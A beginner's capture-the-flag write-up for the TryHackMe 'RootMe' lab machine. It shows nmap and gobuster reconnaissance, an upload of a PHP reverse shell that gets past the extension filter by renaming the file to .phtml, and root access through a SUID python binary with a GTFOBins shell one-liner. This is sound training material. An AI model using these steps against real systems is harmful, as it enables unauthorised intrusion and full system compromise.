A ctf for beginners, can you root me?

<br>

## 1. Deploy the machine    

Connect to TryHackMe network and deploy the machine. If you don't know how to do this, complete the OpenVPN room first.

<br>

## 2 Reconnaissance 

First, let's get information about the target.

<br>

### 2.1 Scan the machine, how many ports are open?

Let's do a nmap scan.

```
$ nmap -sSCV 10.10.226.173
```

![nmap](/assets/img/tryhackme/rootme/nmap.png)

Two ports are open. These are **`22/tcp SSH and 80/tcp HTTP`**. 

**`Answer: 2`**


<br>

### 2.2 What version of Apache is running?

![apache](/assets/img/tryhackme/rootme/apache.png)

**`Answer: 2.4.29`**

<br>

### 2.3 What service is running on port 22?

**`Answer: SSH`**

<br>

### 2.4 Find directories on the web server using the GoBuster tool.

I am visiting the website running on port 80. I see a page like this:

![home](/assets/img/tryhackme/rootme/home.png)

Let's do a gobuster scan for this website.

```
$ gobuster dir -u http://10.10.226.173/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

<br>

### 2.5 What is the hidden directory?

**`Answer: /panel/`**

## 3 Getting a shell  

Find a form to upload and get a reverse shell, and find the flag.

<br>

### 3.1 user.txt

I check the /uploads/ directory but nothing in here.

![uploads](/assets/img/tryhackme/rootme/uploads.png)

I am going to the /panel/ directory.

![panel](/assets/img/tryhackme/rootme/panel.png)

We upload files here. Then let's do this:
 - Let's download pentestmonkey's php-reverse-shell.php file. [Here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
   ```
   $ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
   ```
 - Now, edit the php-reverse-shell.php file.

   ![edit](/assets/img/tryhackme/rootme/edit.png)

 - Let's set up a netcat listener.

   ![nc](/assets/img/tryhackme/rootme/nc.png)

Now we can upload the file to the website. Let's go back to the /panel/ directory.

I try to upload the file but it's not working. I get error like this.

![error](/assets/img/tryhackme/rootme/error.png)

Let's try changing the extension of the PHP file. Like this:

![ex](/assets/img/tryhackme/rootme/ex.png)

If you want, you can try using burp suite, but there is not much possibility anyway, I prefer to change manually.

I will try these: `.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml`

The `.phtml` worked.

Now, let's go to the /uploads/ directory and run the reverse shell we uploaded.

![upshell](/assets/img/tryhackme/rootme/upshell.png)

And we are inside.

![in](/assets/img/tryhackme/rootme/in.png)

Now we can get the user flag.
I looked at the user directories in the home directory, but could not find the user.txt.

Now let's find user.txt with this command.

![find](/assets/img/tryhackme/rootme/find.png)

```
$ find / -type f -name user.txt
```

Yes, we found the user.txt file.

![finduser](/assets/img/tryhackme/rootme/finduser.png)

Let's get the user flag.

![user-flag](/assets/img/tryhackme/rootme/user-flag.png)


_**Attention: It allows some files to be uploaded, but when you try to run it in the /uploads/ directory, you get something like this.**_

![uperror](/assets/img/tryhackme/rootme/uperror.png)

## 4 Privilege escalation   

Now that we have a shell, let's escalate our privileges to root.

<br>

### 4.1 Search for files with SUID permission, which file is weird?

_**Hint: find / -user root -perm /4000**_

Based on the hint, I ran the following code on the target system.

```
$ find / -type f -perm -04000 -ls 2>/dev/null
```

![suid](/assets/img/tryhackme/rootme/suid.png)

**`Answer: /usr/bin/python`**

<br>

### 4.2 Find a form to escalate your privileges.

_**Hint : Search for gtfobins**_

Let's go to [gtfobins](https://gtfobins.github.io/gtfobins/python/) and search for python. 

![gtfobins](/assets/img/tryhackme/rootme/gtfobins.png)

Let's run the following code on the target machine.

```
$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![privesc](/assets/img/tryhackme/rootme/privesc.png)

Yesss, We get root privilege. Now let's get the root flag.

It was such a fun CTF. I hope you learned something and had fun too. But thatâ€™s it for now till next time take care.
